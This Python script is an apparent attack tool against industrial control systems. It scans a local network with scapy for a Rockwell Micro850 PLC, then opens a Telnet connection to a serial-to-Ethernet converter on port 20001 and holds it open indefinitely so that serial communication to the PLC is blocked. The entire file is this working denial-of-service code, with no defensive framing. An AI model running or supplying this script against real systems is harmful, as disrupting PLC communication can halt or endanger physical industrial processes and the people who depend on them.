import socket
import telnetlib
import scapy.all as scapy
import time

# Function to scan the network for the PLC
def find_plc_ip(network_prefix):
    print("[+] Scanning network for Rockwell Micro850 PLC...")
    devices = scapy.arping(network_prefix + ".*", verbose=0)[0]
    
    for sent, received in devices:
        if "Rockwell" in received.hwsrc or received.psrc.startswith("10.0.0."):
            print(f"[+] PLC Found at IP: {received.psrc}")
            return received.psrc
    
    print("[-] PLC not found.")
    return None

# Function to block the serial COM by opening and holding a Telnet session
def block_serial_com(target_ip, port):
    try:
        print(f"[+] Connecting to Serial-to-Ethernet Converter at {target_ip}:{port} ...")
        telnet = telnetlib.Telnet(target_ip, port)
        print(f"[+] Holding connection open on port {port} to block serial COM...")
        
        # Hold the connection indefinitely
        while True:
            time.sleep(10)  # Prevent high CPU usage

    except Exception as e:
        print(f"[-] Failed to connect or hold the port: {str(e)}")

# Main execution flow
if __name__ == "__main__":
    network_prefix = "10.0.0"  # Modify according to your network
    plc_ip = find_plc_ip(network_prefix)

    if plc_ip:
        serial_to_ethernet_ip = "10.0.0.1"  # Modify if necessary
        serial_com_port = 20001  # Example port for serial COM 1
        
        block_serial_com(serial_to_ethernet_ip, serial_com_port)
    else:
        print("[-] Could not locate PLC. Exiting.")